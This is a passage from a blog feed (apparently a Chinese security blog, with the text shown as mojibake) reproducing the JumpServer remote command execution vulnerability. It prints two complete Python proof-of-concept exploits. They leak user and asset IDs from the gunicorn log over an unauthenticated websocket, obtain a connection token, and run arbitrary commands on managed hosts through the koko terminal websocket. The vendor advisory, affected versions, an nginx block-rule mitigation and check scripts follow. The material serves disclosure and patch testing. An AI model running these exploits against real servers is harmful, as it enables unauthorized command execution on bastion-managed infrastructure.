¸8Gã€‚ã€‚ä¹‹å‰å‚»é€¼äº†ï¼Œä»¥ä¸ºCentOSå®‰è£…å¥½åï¼Œé‡å¯æˆä¸ºå‘½ä»¤è¡Œæ¨¡å¼ï¼Œä»¥ä¸ºæ˜¯é”™çš„ï¼Œç»“æœè¿™æ˜¯ä»¥ä¸ºæ²¡æœ‰å®‰è£…guiã€‚</p><p><a href="https://zhuanlan.zhihu.com/p/126601630">https://zhuanlan.zhihu.com/p/126601630</a></p><p>CentOS 7 ï¼š<a href="https://mirrors.ustc.edu.cn/centos/7.9.2009/isos/x86_64/">https://mirrors.ustc.edu.cn/centos/7.9.2009/isos/x86_64/</a></p><h1 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h1><h2 id="å…¬å¼€POC-1"><a href="#å…¬å¼€POC-1" class="headerlink" title="å…¬å¼€POC 1"></a>å…¬å¼€POC 1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># import requests</span></span><br><span class="line"><span class="comment"># import json</span></span><br><span class="line"><span class="comment"># data=&#123;&quot;user&quot;:&quot;4320ce47-e0e0-4b86-adb1-675ca611ea0c&quot;,&quot;asset&quot;:&quot;ccb9c6d7-6221-445e-9fcc-b30c95162825&quot;,&quot;system_user&quot;:&quot;79655e4e-1741-46af-a793-fff394540a52&quot;&#125;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># url_host=&#x27;http://192.168.1.73:8080&#x27;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># def get_token():</span></span><br><span class="line"><span class="comment">#     url = url_host+&#x27;/api/v1/users/connection-token/?user-only=1&#x27;</span></span><br><span class="line"><span class="comment">#     url =url_host+&#x27;/api/v1/authentication/connection-token/?user-only=1&#x27;</span></span><br><span class="line"><span class="comment">#     response = requests.post(url, json=data).json()</span></span><br><span class="line"><span class="comment">#     print(response)</span></span><br><span class="line"><span class="comment">#     ret=requests.get(url_host+&#x27;/api/v1/authentication/connection-token/?token=%s&#x27;%response[&#x27;token&#x27;])</span></span><br><span class="line"><span class="comment">#     print(ret.text)</span></span><br><span class="line"><span class="comment"># get_token()</span></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">url = <span class="string">&quot;/api/v1/authentication/connection-token/?user-only=None&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘æœåŠ¡å™¨ç«¯å‘é€è®¤è¯åçš„æ¶ˆæ¯</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">send_msg</span>(<span class="params">websocket,_text</span>):</span></span><br><span class="line">    <span class="keyword">if</span> _text == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">        print(<span class="string">f&#x27;you have enter &quot;exit&quot;, goodbye&#x27;</span>)</span><br><span class="line">        <span class="keyword">await</span> websocket.close(reason=<span class="string">&quot;user exit&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">await</span> websocket.send(_text)</span><br><span class="line">    recv_text = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">    print(<span class="string">f&quot;<span class="subst">&#123;recv_text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®¢æˆ·ç«¯ä¸»é€»è¾‘</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main_logic</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    print(<span class="string">&quot;#######start ws&quot;</span>)</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(target) <span class="keyword">as</span> websocket:</span><br><span class="line">        recv_text = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">        print(<span class="string">f&quot;<span class="subst">&#123;recv_text&#125;</span>&quot;</span>)</span><br><span class="line">        resws=json.loads(recv_text)</span><br><span class="line">        id = resws[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">        print(<span class="string">&quot;get ws id:&quot;</span>+id)</span><br><span class="line">        print(<span class="string">&quot;###############&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;init ws&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;###############&quot;</span>)</span><br><span class="line">        inittext = json.dumps(&#123;<span class="string">&quot;id&quot;</span>: id, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;TERMINAL_INIT&quot;</span>, <span class="string">&quot;data&quot;</span>: <span class="string">&quot;&#123;\&quot;cols\&quot;:164,\&quot;rows\&quot;:17&#125;&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">await</span> send_msg(websocket,inittext)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">            recv_text = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">            print(<span class="string">f&quot;<span class="subst">&#123;recv_text&#125;</span>&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;###############&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;exec cmd: ls&quot;</span>)</span><br><span class="line">        cmdtext = json.dumps(&#123;<span class="string">&quot;id&quot;</span>: id, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;TERMINAL_DATA&quot;</span>, <span class="string">&quot;data&quot;</span>: cmd+<span class="string">&quot;\r\n&quot;</span>&#125;)</span><br><span class="line">        print(cmdtext)</span><br><span class="line">        <span class="keyword">await</span> send_msg(websocket, cmdtext)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">            recv_text = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">            print(<span class="string">f&quot;<span class="subst">&#123;recv_text&#125;</span>&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;#######finish&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> sys</span><br><span class="line">        host=sys.argv[<span class="number">1</span>]</span><br><span class="line">        cmd=sys.argv[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> host[<span class="number">-1</span>]==<span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            host=host[:<span class="number">-1</span>]</span><br><span class="line">        print(host)</span><br><span class="line">        data = &#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;4320ce47-e0e0-4b86-adb1-675ca611ea0c&quot;</span>, <span class="string">&quot;asset&quot;</span>: <span class="string">&quot;ccb9c6d7-6221-445e-9fcc-b30c95162825&quot;</span>,</span><br><span class="line">                <span class="string">&quot;system_user&quot;</span>: <span class="string">&quot;79655e4e-1741-46af-a793-fff394540a52&quot;</span>&#125;</span><br><span class="line">        print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;get token url:%s&quot;</span> % (host + url,))</span><br><span class="line">        print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line">        res = requests.post(host + url, json=data)</span><br><span class="line">        token = res.json()[<span class="string">&quot;token&quot;</span>]</span><br><span class="line">        print(<span class="string">&quot;token:%s&quot;</span>, (token,))</span><br><span class="line">        print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line">        target = <span class="string">&quot;ws://&quot;</span> + host.replace(<span class="string">&quot;http://&quot;</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;/koko/ws/token/?target_id=&quot;</span> + token</span><br><span class="line">        print(<span class="string">&quot;target ws:%s&quot;</span> % (target,))</span><br><span class="line">        asyncio.get_event_loop().run_until_complete(main_logic(cmd))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;python jumpserver.py http://192.168.1.73 whoami&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="å…¬å¼€POC-2"><a href="#å…¬å¼€POC-2" class="headerlink" title="å…¬å¼€POC 2"></a>å…¬å¼€POC 2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">target_url = <span class="string">&#x27;http://127.0.0.1&#x27;</span></span><br><span class="line">cmd = <span class="string">&quot;ifconfig&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">get_token</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;========================================================================================================================================================&#x27;</span>)</span><br><span class="line">    url = target_url.replace(<span class="string">&quot;http&quot;</span>, <span class="string">&quot;ws&quot;</span>) + <span class="string">&quot;/ws/ops/tasks/log/&quot;</span></span><br><span class="line">    print(<span class="string">&quot;Request =&gt; &quot;</span> + url + <span class="string">&quot;token&quot;</span>)</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(url, timeout=<span class="number">3</span>) <span class="keyword">as</span> websocket:</span><br><span class="line">        <span class="keyword">await</span> websocket.send(<span class="string">&#x27;&#123;&quot;task&quot;:&quot;/opt/jumpserver/logs/gunicorn&quot;&#125;&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                rs = <span class="keyword">await</span> asyncio.wait_for(websocket.recv(), timeout=<span class="number">3</span>)</span><br><span class="line">                print(<span class="string">&quot;Recv =&gt; &quot;</span> + rs)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;/api/v1/perms/asset-permissions/user/validate&#x27;</span> <span class="keyword">in</span> rs:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                print(<span class="string">&quot;Vulnerability may not exist&quot;</span>)</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">        print(<span class="string">&#x27;========================================================================================================================================================&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;Vulnerability may exist&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        pattern = re.compile(<span class="string">r&#x27;asset_id=(.*?)&amp;cache_policy=1&amp;system_user_id=(.*?)&amp;user_id=(.*?) &#x27;</span>)</span><br><span class="line">        matchObj = pattern.search(rs)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> matchObj:</span><br><span class="line">            asset_id = matchObj.group(<span class="number">1</span>)</span><br><span class="line">            print(<span class="string">&#x27;asset_id = &#x27;</span> + asset_id)</span><br><span class="line">            system_user_id = matchObj.group(<span class="number">2</span>)</span><br><span class="line">            print(<span class="string">&#x27;system_user_id = &#x27;</span> + system_user_id)</span><br><span class="line">            user_id = matchObj.group(<span class="number">3</span>)</span><br><span class="line">            print(<span class="string">&#x27;user_id = &#x27;</span> + user_id)</span><br><span class="line">    print(<span class="string">&#x27;========================================================================================================================================================&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    data = &#123;<span class="string">&#x27;asset&#x27;</span>: asset_id, <span class="string">&#x27;system_user&#x27;</span>: system_user_id, <span class="string">&#x27;user&#x27;</span>: user_id&#125;</span><br><span class="line">    url = target_url + <span class="string">&#x27;/api/v1/users/connection-token/?user-only=1&#x27;</span></span><br><span class="line">    print(<span class="string">&quot;Request =&gt; &quot;</span> + url + <span class="string">&#x27; get token&#x27;</span>)</span><br><span class="line">    response = requests.post(url, json=data).json()</span><br><span class="line">    print(<span class="string">&#x27;token = &#x27;</span> + response[<span class="string">&#x27;token&#x27;</span>])</span><br><span class="line">    print(<span class="string">&#x27;========================================================================================================================================================&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> response[<span class="string">&#x27;token&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(url, timeout=<span class="number">3</span>) <span class="keyword">as</span> websocket:</span><br><span class="line">        print(<span class="string">&quot;Request =&gt; &quot;</span> + url)</span><br><span class="line">        rs = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">        print(<span class="string">&quot;Recv =&gt; &quot;</span> + rs)</span><br><span class="line">        id = json.loads(rs)[<span class="string">&quot;id&quot;</span>]</span><br><span class="line">        print(<span class="string">&quot;id = &quot;</span> + id)</span><br><span class="line">        print(<span class="string">&#x27;========================================================================================================================================================&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        init_payload = json.dumps(&#123;<span class="string">&quot;id&quot;</span>: id, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;TERMINAL_INIT&quot;</span>, <span class="string">&quot;data&quot;</span>: <span class="string">&quot;&#123;\&quot;cols\&quot;:164,\&quot;rows\&quot;:17&#125;&quot;</span>&#125;)</span><br><span class="line">        print(<span class="string">&quot;Request =&gt; &quot;</span> + <span class="string">&quot;TERMINAL_INIT&quot;</span>)</span><br><span class="line">        <span class="keyword">await</span> websocket.send(init_payload)</span><br><span class="line">        rs = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">        print(<span class="string">&quot;Recv =&gt; &quot;</span> + rs)</span><br><span class="line"></span><br><span class="line">        rs = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="string">&quot;Last login&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> rs:</span><br><span class="line">            rs = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">            print(<span class="string">&quot;Recv =&gt; &quot;</span> + rs)</span><br><span class="line"></span><br><span class="line">        cmd_payload = json.dumps(&#123;<span class="string">&quot;id&quot;</span>: id, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;TERMINAL_DATA&quot;</span>, <span class="string">&quot;data&quot;</span>: cmd + <span class="string">&quot;\r\n&quot;</span>&#125;)</span><br><span class="line">        print(<span class="string">&quot;Request =&gt; &quot;</span> + <span class="string">&quot;Cmd Payload&quot;</span>)</span><br><span class="line">        <span class="keyword">await</span> websocket.send(cmd_payload)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                rs = <span class="keyword">await</span> asyncio.wait_for(websocket.recv(), timeout=<span class="number">3</span>)</span><br><span class="line">                print(<span class="string">&quot;Recv =&gt; &quot;</span> + rs)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                print(<span class="string">&#x27;========================================================================================================================================================&#x27;</span>)</span><br><span class="line">                print(<span class="string">&#x27;recv data end&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    token = asyncio.get_event_loop().run_until_complete(get_token())</span><br><span class="line">    url = target_url.replace(<span class="string">&quot;http&quot;</span>, <span class="string">&quot;ws&quot;</span>) + <span class="string">&quot;/koko/ws/token/?target_id=&quot;</span> + token</span><br><span class="line">    asyncio.get_event_loop().run_until_complete(attack(url))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><h1 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h1><p>å‚è€ƒ <a href="https://github.com/jumpserver/jumpserver">https://github.com/jumpserver/jumpserver</a></p><h2 id="ç´§æ€¥BUGä¿®å¤é€šçŸ¥"><a href="#ç´§æ€¥BUGä¿®å¤é€šçŸ¥" class="headerlink" title="ç´§æ€¥BUGä¿®å¤é€šçŸ¥"></a>ç´§æ€¥BUGä¿®å¤é€šçŸ¥</h2><p>JumpServerå‘ç°è¿œç¨‹æ‰§è¡Œæ¼æ´ï¼Œè¯·é€Ÿåº¦ä¿®å¤</p><p>éå¸¸æ„Ÿè°¢ <strong>reactivity of Alibaba Hackerone bug bounty program</strong>(ç‘å…¸) å‘æˆ‘ä»¬æŠ¥å‘Šäº†æ­¤ BUG</p><p><strong>å½±å“ç‰ˆæœ¬:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt; v2.6.2</span><br><span class="line">&lt; v2.5.4</span><br><span class="line">&lt; v2.4.5 </span><br><span class="line">&#x3D; v1.5.9</span><br><span class="line">&gt;&#x3D; v1.5.3</span><br></pre></td></tr></table></figure><p><strong>å®‰å…¨ç‰ˆæœ¬:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&#x3D; v2.6.2</span><br><span class="line">&gt;&#x3D; v2.5.4</span><br><span class="line">&gt;&#x3D; v2.4.5 </span><br><span class="line">&#x3D; v1.5.9 ï¼ˆç‰ˆæœ¬å·æ²¡å˜ï¼‰</span><br><span class="line">&lt; v1.5.3</span><br></pre></td></tr></table></figure><p><strong>ä¿®å¤æ–¹æ¡ˆ:</strong></p><p>å°†JumpServerå‡çº§è‡³å®‰å…¨ç‰ˆæœ¬ï¼›</p><p><strong>ä¸´æ—¶ä¿®å¤æ–¹æ¡ˆ:</strong></p><p>ä¿®æ”¹ Nginx é…ç½®æ–‡ä»¶å±è”½æ¼æ´æ¥å£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;api&#x2F;v1&#x2F;authentication&#x2F;connection-token&#x2F;</span><br><span class="line">&#x2F;api&#x2F;v1&#x2F;users&#x2F;connection-token&#x2F;</span><br></pre></td></tr></table></figure><p>Nginx é…ç½®æ–‡ä»¶ä½ç½®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># ç¤¾åŒºè€ç‰ˆæœ¬</span><br><span class="line">&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;jumpserver.conf</span><br><span class="line"></span><br><span class="line"># ä¼ä¸šè€ç‰ˆæœ¬</span><br><span class="line">jumpserver-release&#x2F;nginx&#x2F;http_server.conf</span><br><span class="line"> </span><br><span class="line"># æ–°ç‰ˆæœ¬åœ¨ </span><br><span class="line">jumpserver-release&#x2F;compose&#x2F;config_static&#x2F;http_server.conf</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ Nginx é…ç½®æ–‡ä»¶å®ä¾‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">### ä¿è¯åœ¨ &#x2F;api ä¹‹å‰ å’Œ &#x2F; ä¹‹å‰</span><br><span class="line">location &#x2F;api&#x2F;v1&#x2F;authentication&#x2F;connection-token&#x2F; &#123;</span><br><span class="line">   return 403;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">location &#x2F;api&#x2F;v1&#x2F;users&#x2F;connection-token&#x2F; &#123;</span><br><span class="line">   return 403;</span><br><span class="line">&#125;</span><br><span class="line">### æ–°å¢ä»¥ä¸Šè¿™äº›</span><br><span class="line"> </span><br><span class="line">location &#x2F;api&#x2F; &#123;</span><br><span class="line">    proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">    proxy_set_header Host $host;</span><br><span class="line">    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    proxy_pass http:&#x2F;&#x2F;core:8080;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹å®Œæˆåé‡å¯ nginx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dockeræ–¹å¼: </span><br><span class="line">docker restart jms_nginx</span><br><span class="line"></span><br><span class="line">nginxæ–¹å¼:</span><br><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure><p><strong>ä¿®å¤éªŒè¯</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ wget https:&#x2F;&#x2F;github.com&#x2F;jumpserver&#x2F;jumpserver&#x2F;releases&#x2F;download&#x2F;v2.6.2&#x2F;jms_bug_check.sh </span><br><span class="line"></span><br><span class="line"># ä½¿ç”¨æ–¹æ³• bash jms_bug_check.sh HOST </span><br><span class="line">$ bash jms_bug_check.sh demo.jumpserver.org</span><br><span class="line">æ¼æ´å·²ä¿®å¤</span><br></pre></td></tr></table></figure><p><strong>å…¥ä¾µæ£€æµ‹</strong></p><p>ä¸‹è½½è„šæœ¬åˆ° jumpserver æ—¥å¿—ç›®å½•ï¼Œè¿™ä¸ªç›®å½•ä¸­å­˜åœ¨ gunicorn.logï¼Œç„¶åæ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ pwd</span><br><span class="line">&#x2F;opt&#x2F;jumpserver&#x2F;core&#x2F;logs</span><br><span class="line"></span><br><span class="line">$ ls gunicorn.log </span><br><span class="line">gunicorn.log</span><br><span class="line"></span><br><span class="line">$ wget &#39;https:&#x2F;&#x2F;github.com&#x2F;jumpserver&#x2F;jumpserver&#x2F;releases&#x2F;download&#x2F;v2.6.2&#x2F;jms_check_attack.sh&#39;</span><br><span class="line">$ bash jms_check_attack.sh</span><br><span class="line">ç³»ç»Ÿæœªè¢«å…¥ä¾µ</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p><a href="https://mp.weixin.qq.com/s/KGRU47o7JtbgOC9xwLJARw">https://mp.weixin.qq.com/s/KGRU47o7JtbgOC9xwLJARw</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æ¼æ´èƒŒæ™¯&quot;&gt;&lt;a href=&quot;#æ¼æ´èƒŒæ™¯&quot; class=&quot;headerlink&quot; title=&quot;æ¼æ´èƒŒæ™¯&quot;&gt;&lt;/a&gt;æ¼æ´èƒŒæ™¯&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;JumpServer&lt;/strong&gt; æ˜¯å…¨çƒé¦–æ¬¾å®Œå…¨å¼€æºçš„å ¡å’æœº, ä½¿ç”¨ GNU GPL v2.0 å¼€æºå</summary>
      
    
    
    
    
    <category term="æ¼æ´å¤ç°" scheme="https://hack-for.fun/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>æ¼æ´å¤ç°ï¼šCVE-2020-17518 Apache Flink ç›®å½•éå†æ¼æ´</title>
    <link href="https://hack-for.fun/16e0.html"/>
    <id>https://hack-for.fun/16e0.html</id>
    <published>2021-01-18T07:37:00.000Z</published>
    <updated>2021-01-18T12:43:31.325Z</updated>
    
